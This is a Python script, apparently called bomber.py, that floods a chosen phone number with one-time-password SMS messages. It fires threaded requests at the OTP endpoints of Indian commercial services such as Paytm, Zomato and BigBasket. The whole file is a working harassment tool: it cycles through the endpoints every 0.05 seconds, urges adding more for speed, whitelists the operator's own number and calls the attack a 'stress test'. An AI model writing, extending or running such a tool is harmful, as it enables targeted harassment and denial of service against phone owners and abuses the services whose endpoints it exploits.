import requests
import threading
import time
import sys

# --- CONFIGURATION ---
# Replace these with real API endpoints you find using Inspect Element -> Network tab
# format: {"url": "...", "method": "POST", "data": {"phone_field": "TARGET"}}
APIS = [
    {"url": "https://p.paytm.me/api/v1/login/otp", "method": "POST", "data": {"phone": "TARGET"}},
    {"url": "https://api.zomato.com/v2/otp/send", "method": "POST", "data": {"mobile": "TARGET"}},
    {"url": "https://www.bigbasket.com/svc/registration/otp-gen/", "method": "GET", "params": {"otp_type": "1", "mobile_number": "TARGET"}},
    # Add 10-15 more active endpoints here for maximum speed
]

# Protection List (White-list your own number here)
PROTECTED = ["919876543210"] 

def send_otp(api, target):
    try:
        # Prepare the data by replacing 'TARGET' with the actual number
        payload = {}
        for k, v in api.get("data", {}).items():
            payload[k] = target if v == "TARGET" else v
        
        params = {}
        for k, v in api.get("params", {}).items():
            params[k] = target if v == "TARGET" else v

        if api["method"] == "POST":
            r = requests.post(api["url"], json=payload, timeout=5)
        else:
            r = requests.get(api["url"], params=params, timeout=5)
            
        if r.status_code == 200:
            print(f" \033[1;32m[+]\033[0m Success: {api['url'].split('/')[2]}")
    except:
        pass

def start_flood(target, count):
    if target in PROTECTED:
        print("\n \033[1;31m[!] ERROR: This number is white-listed and protected.\033[0m")
        return

    print(f"\n \033[1;33m[*] Launching Flood on {target} ({count} requests)...\033[0m")
    threads = []
    
    for i in range(count):
        api = APIS[i % len(APIS)]
        t = threading.Thread(target=send_otp, args=(api, target))
        threads.append(t)
        t.start()
        time.sleep(0.05) # Super fast interval (0.05s)

    for t in threads:
        t.join()
    
    print(f"\n \033[1;32m[!] Stress Test Completed.\033[0m")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 bomber.py <number> <count>")
    else:
        # Auto-format to 10 digits for Indian APIs if needed
        num = sys.argv[1]
        if len(num) == 10: num = "91" + num
        start_flood(num, int(sys.argv[2]))